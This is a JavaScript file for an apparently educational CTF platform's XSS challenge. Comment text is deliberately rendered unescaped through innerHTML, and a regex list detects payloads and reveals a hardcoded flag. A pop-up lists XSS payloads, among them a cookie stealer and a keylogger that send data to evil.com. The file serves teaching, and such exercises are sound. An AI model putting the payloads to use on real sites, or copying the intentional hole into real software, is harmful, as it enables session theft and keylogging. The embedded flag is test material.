/**
 * CTF Platform - XSS Challenge
 * Логика для XSS челленджа
 */

class XSSChallenge {
    constructor() {
        this.comments = [];
        this.init();
    }

    init() {
        this.initEventListeners();
        this.loadSampleComments();
    }

    initEventListeners() {
        const postCommentBtn = document.getElementById('postCommentBtn');
        const commentInput = document.getElementById('commentInput');
        const resetCommentsBtn = document.getElementById('resetCommentsBtn');
        const showExamplesBtn = document.getElementById('showExamplesBtn');

        if (postCommentBtn) {
            postCommentBtn.addEventListener('click', () => {
                this.postComment();
            });
        }

        if (commentInput) {
            commentInput.addEventListener('keypress', (e) => {
                if (e.key === 'Enter') {
                    this.postComment();
                }
            });
        }

        if (resetCommentsBtn) {
            resetCommentsBtn.addEventListener('click', () => {
                this.resetComments();
            });
        }

        if (showExamplesBtn) {
            showExamplesBtn.addEventListener('click', () => {
                this.showXSSExamples();
            });
        }
    }

    loadSampleComments() {
        this.comments = [
            {
                id: 1,
                user: 'admin',
                text: 'Welcome to the comment section! Be careful what you post here.',
                timestamp: new Date()
            },
            {
                id: 2,
                user: 'user123',
                text: 'This is a test comment. The comment system seems secure.',
                timestamp: new Date(Date.now() - 300000)
            }
        ];
        this.renderComments();
    }

    postComment() {
        const commentInput = document.getElementById('commentInput');
        if (!commentInput) return;

        const text = commentInput.value.trim();
        if (!text) {
            CTFPlatform.showNotification('Please enter a comment', 'warning');
            return;
        }

        const newComment = {
            id: this.comments.length + 1,
            user: 'anonymous',
            text: text,
            timestamp: new Date()
        };

        this.comments.push(newComment);
        this.renderComments();

        commentInput.value = '';

        // Проверяем XSS payload
        this.checkForXSS(text);
    }

    renderComments() {
        const container = document.getElementById('commentsContainer');
        if (!container) return;

        container.innerHTML = '';

        this.comments.forEach(comment => {
            const commentElement = this.createCommentElement(comment);
            container.appendChild(commentElement);
        });

        // Прокручиваем к последнему комментарию
        container.scrollTop = container.scrollHeight;
    }

    createCommentElement(comment) {
        const commentDiv = document.createElement('div');
        commentDiv.className = 'comment';

        const metaDiv = document.createElement('div');
        metaDiv.className = 'comment-meta';
        metaDiv.innerHTML = `
            <strong>${CTFUtils.escapeHtml(comment.user)}</strong>
            <span>${this.formatTime(comment.timestamp)}</span>
        `;

        const textDiv = document.createElement('div');
        textDiv.className = 'comment-text';

        // ОПАСНО: не экранируем HTML для демонстрации XSS уязвимости
        // В реальном приложении всегда используйте CTFUtils.escapeHtml(comment.text)
        textDiv.innerHTML = comment.text;

        commentDiv.appendChild(metaDiv);
        commentDiv.appendChild(textDiv);

        return commentDiv;
    }

    formatTime(timestamp) {
        return new Date(timestamp).toLocaleTimeString('ru-RU', {
            hour: '2-digit',
            minute: '2-digit'
        });
    }

    checkForXSS(text) {
        // Простая проверка на XSS payload
        const xssPatterns = [
            /<script>/i,
            /javascript:/i,
            /onclick=/i,
            /onload=/i,
            /onerror=/i,
            /onmouseover=/i,
            /<img src=/i,
            /<iframe src=/i,
            /<svg onload=/i,
            /alert\(/i,
            /document\.cookie/i,
            /window\.location/i
        ];

        const hasXSS = xssPatterns.some(pattern => pattern.test(text));

        if (hasXSS) {
            CTFPlatform.showNotification('XSS payload detected! Good job!', 'success');
            this.showFlag();

            // Логируем успешную XSS атаку
            console.log('XSS Payload executed:', text);
        }
    }

    showFlag() {
        const flag = 'CTF{XSS_MASTER_2024}';
        const container = document.getElementById('commentsContainer');
        if (!container) return;

        const flagElement = document.createElement('div');
        flagElement.className = 'comment flag-message';
        flagElement.style.background = 'rgba(0, 255, 136, 0.1)';
        flagElement.style.border = '1px solid var(--primary-color)';
        flagElement.style.borderRadius = '8px';

        flagElement.innerHTML = `
            <div class="comment-meta">
                <strong>🏆 System</strong>
                <span>${this.formatTime(new Date())}</span>
            </div>
            <div class="comment-text">
                🎉 Congratulations! You successfully executed an XSS attack!<br>
                <strong style="color: var(--primary-color);">Flag: ${flag}</strong><br>
                <small style="color: var(--text-secondary);">Click to copy the flag</small>
            </div>
        `;

        flagElement.addEventListener('click', () => {
            CTFUtils.copyToClipboard(flag);
            CTFPlatform.showNotification('Flag copied to clipboard!', 'success');
        });

        container.appendChild(flagElement);

        // Прокручиваем к флагу
        flagElement.scrollIntoView({ behavior: 'smooth' });

        // Автоматически копируем флаг в буфер обмена
        CTFUtils.copyToClipboard(flag);
    }

    resetComments() {
        this.comments = [];
        this.loadSampleComments();
        CTFPlatform.showNotification('Comments have been reset', 'info');
    }

    showXSSExamples() {
        const examples = [
            "Basic Script: <script>alert('XSS')</script>",
            "Image XSS: <img src=x onerror=alert('XSS')>",
            "SVG XSS: <svg onload=alert('XSS')>",
            "JavaScript URL: javascript:alert('XSS')",
            "Body XSS: <body onload=alert('XSS')>",
            "Cookie Stealer: <script>fetch('http://evil.com?cookie='+document.cookie)</script>",
            "Redirect: <script>window.location='http://evil.com'</script>",
            "Keylogger: <script>document.onkeypress=function(e){fetch('http://evil.com?key='+e.key)}</script>"
        ];

        // Создаем модальное окно с примерами
        const modal = document.createElement('div');
        modal.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10000;
        `;

        const modalContent = document.createElement('div');
        modalContent.style.cssText = `
            background: var(--background-card);
            padding: 2rem;
            border-radius: 15px;
            border: 2px solid var(--primary-color);
            max-width: 600px;
            max-height: 80vh;
            overflow-y: auto;
            color: var(--text-primary);
        `;

        const title = document.createElement('h3');
        title.textContent = 'XSS Payload Examples';
        title.style.color = 'var(--primary-color)';
        title.style.marginBottom = '1rem';
        title.style.fontFamily = 'Orbitron, sans-serif';

        const examplesList = document.createElement('div');
        examplesList.style.fontFamily = 'Courier New, monospace';
        examplesList.style.fontSize = '0.9rem';
        examplesList.style.lineHeight = '1.5';

        examples.forEach((example, index) => {
            const exampleDiv = document.createElement('div');
            exampleDiv.style.marginBottom = '0.5rem';
            exampleDiv.style.padding = '0.5rem';
            exampleDiv.style.background = 'rgba(255, 255, 255, 0.05)';
            exampleDiv.style.borderRadius = '4px';
            exampleDiv.style.border = '1px solid var(--border-color)';
            exampleDiv.textContent = `${index + 1}. ${example}`;
            examplesList.appendChild(exampleDiv);
        });

        const warning = document.createElement('div');
        warning.style.marginTop = '1rem';
        warning.style.padding = '1rem';
        warning.style.background = 'rgba(255, 165, 0, 0.1)';
        warning.style.border = '1px solid #ffa500';
        warning.style.borderRadius = '4px';
        warning.style.color = '#ffa500';
        warning.textContent = '⚠️ Use these examples for educational purposes only in controlled environments.';

        const closeBtn = document.createElement('button');
        closeBtn.textContent = 'Close';
        closeBtn.className = 'cta-btn primary';
        closeBtn.style.marginTop = '1rem';
        closeBtn.style.width = '100%';
        closeBtn.addEventListener('click', () => {
            modal.remove();
        });

        modalContent.appendChild(title);
        modalContent.appendChild(examplesList);
        modalContent.appendChild(warning);
        modalContent.appendChild(closeBtn);
        modal.appendChild(modalContent);

        modal.addEventListener('click', (e) => {
            if (e.target === modal) {
                modal.remove();
            }
        });

        document.body.appendChild(modal);
    }

    // Метод для безопасного рендеринга (для сравнения)
    renderCommentSafely(comment) {
        const commentDiv = document.createElement('div');
        commentDiv.className = 'comment';

        const metaDiv = document.createElement('div');
        metaDiv.className = 'comment-meta';
        metaDiv.innerHTML = `
            <strong>${CTFUtils.escapeHtml(comment.user)}</strong>
            <span>${this.formatTime(comment.timestamp)}</span>
        `;

        const textDiv = document.createElement('div');
        textDiv.className = 'comment-text';

        // Безопасный рендеринг - экранируем HTML
        textDiv.textContent = comment.text;

        commentDiv.appendChild(metaDiv);
        commentDiv.appendChild(textDiv);

        return commentDiv;
    }
}

// Инициализация на странице XSS
document.addEventListener('DOMContentLoaded', () => {
    if (window.location.pathname.includes('/xss')) {
        window.xssChallenge = new XSSChallenge();
    }
});